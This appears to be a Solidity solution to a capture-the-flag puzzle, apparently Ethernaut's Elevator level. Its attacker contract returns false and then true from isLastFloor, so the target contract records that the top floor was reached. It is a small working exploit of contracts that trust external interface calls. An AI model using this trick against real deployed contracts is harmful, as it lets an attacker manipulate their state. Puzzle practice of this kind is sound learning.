// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Elevator, Building} from "../../puzzles/11/Elevator.sol";

contract ElevatorAttacker is Building {
    uint256 public lastFloor = 0;
    Elevator internal elevator;

    constructor(address _elevator) {
        elevator = Elevator(_elevator);
    }

    function isLastFloor(uint256 _floor) external override returns (bool) {
        bool result = false;
        if(_floor == lastFloor) {
            result = true;
        }
        lastFloor = _floor;
        return result;
    }

    function attack() public {
        elevator.goTo(1);
    }
}
